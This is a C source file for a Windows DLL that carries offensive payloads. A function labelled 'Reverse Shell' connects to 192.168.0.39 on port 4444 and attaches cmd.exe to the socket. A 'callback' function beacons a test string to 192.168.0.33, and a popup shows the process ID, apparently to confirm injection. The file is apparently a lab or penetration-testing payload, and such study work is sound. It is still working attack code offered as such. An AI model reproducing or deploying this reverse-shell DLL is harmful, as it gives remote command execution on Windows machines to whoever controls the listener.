// defaults 
#include <stdio.h>
#include <windows.h>
#include "process.h"
#include <tchar.h>
// sockets
#include <winsock2.h>
#include <ws2tcpip.h>
#include <io.h>
// DLLMain is the entry point for dll files
INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
    switch(Reason) {
        case DLL_PROCESS_ATTACH:
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        //MessageBoxA(0 , "DLL Thread Detach called" , "Success!" , MB_ICONEXCLAMATION | MB_OK);
        break;
    }
    return TRUE;
}
// PopUp
int info() {
    char string[256] = "Hello, there! Brought to you by PID #";
    char buffer[256];
    int pid = getpid();
    sprintf(buffer, "%d", pid );
    strcat(string, buffer);     
    return MessageBoxA(0 , string , "Success!!!" , MB_ICONEXCLAMATION | MB_OK); 
}
// Reverse Shell
int shell(int argc, _TCHAR* argv[]) {
    WSADATA wsaData; STARTUPINFO sui; PROCESS_INFORMATION pi;
    struct sockaddr_in hax;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	hax.sin_family = AF_INET;
	hax.sin_port = htons(4444);
	hax.sin_addr.s_addr = inet_addr("192.168.0.39");
	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
	TCHAR commandLine[256] = "cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
}
// callback
int callback(int argc, char *argv[]) {
    WSADATA wsaData;
    SOCKET SendingSocket;
    SOCKADDR_IN ServerAddr, ThisSenderInfo;
    unsigned int Port = 4444;
    int  RetCode;        
    char sendbuf[1024] = "This is a test string from sender";    
    int BytesSent, nlen;       
    WSAStartup(MAKEWORD(2,2), &wsaData); //printf("Winsock status: %s.\n", wsaData.szSystemStatus);           
    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    
    if(SendingSocket == INVALID_SOCKET) { WSACleanup(); return -1; }     
    ServerAddr.sin_family = AF_INET;        
    ServerAddr.sin_port = htons(Port);        
    ServerAddr.sin_addr.s_addr = inet_addr("192.168.0.33");  
    RetCode = connect(SendingSocket, (SOCKADDR *) &ServerAddr, sizeof(ServerAddr));    
    if(RetCode != 0) { closesocket(SendingSocket); WSACleanup(); return -1; }     
    getsockname(SendingSocket, (SOCKADDR *)&ServerAddr, (int *)sizeof(ServerAddr));               
    BytesSent = send(SendingSocket, sendbuf, strlen(sendbuf), 0);
    printf("sent: %d\n", BytesSent);
    shutdown(SendingSocket, SD_SEND);
    closesocket(SendingSocket);    
    WSACleanup();
    return 0;
}
